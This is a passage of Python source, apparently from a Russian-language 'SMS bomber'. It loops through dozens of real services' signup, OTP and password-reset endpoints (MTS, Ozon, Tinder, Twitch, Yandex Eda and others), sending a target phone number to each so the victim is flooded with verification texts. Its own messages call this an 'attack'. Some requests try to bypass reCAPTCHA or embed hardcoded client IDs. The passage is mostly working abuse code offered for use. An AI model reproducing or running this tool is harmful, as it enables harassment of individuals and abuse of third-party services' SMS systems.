        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            R = R + 1
            print('[+] City24 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            R = R + 1
            print('[+] SushiMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            R = R + 1
            print('[+] MultiPlex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            R = R + 1
            print('[+] 3040 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            R = R + 1
            print('[+] Niyama Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            R = R + 1
            print('[+] VSK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            R = R + 1
            print('[+] EasyPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            R = R + 1
            print('[+] Fix-Price Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            R = R + 1
            print('[+] Tele2 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] Finam Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            R = R + 1
            print('[+] MakiMaki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            R = R + 1
            print('[+] FlipKart Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            R = R + 1
            print('[+] Online.ua Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            R = R + 1
            print('[+] PlanetaKino Was sent!')
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": _codes[_code].upper(), "phone": _phone, })
            R = R + 1
            print('[+] OnTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Iqos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            R = R + 1
            print('[+] Smart.Space Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            R = R + 1
            print('[+] tarantino-family Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            R = R + 1
            print('[+] Apteka Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            R = R + 1
            print('[+] Uklon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            R = R + 1
            print('[+] Ozon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
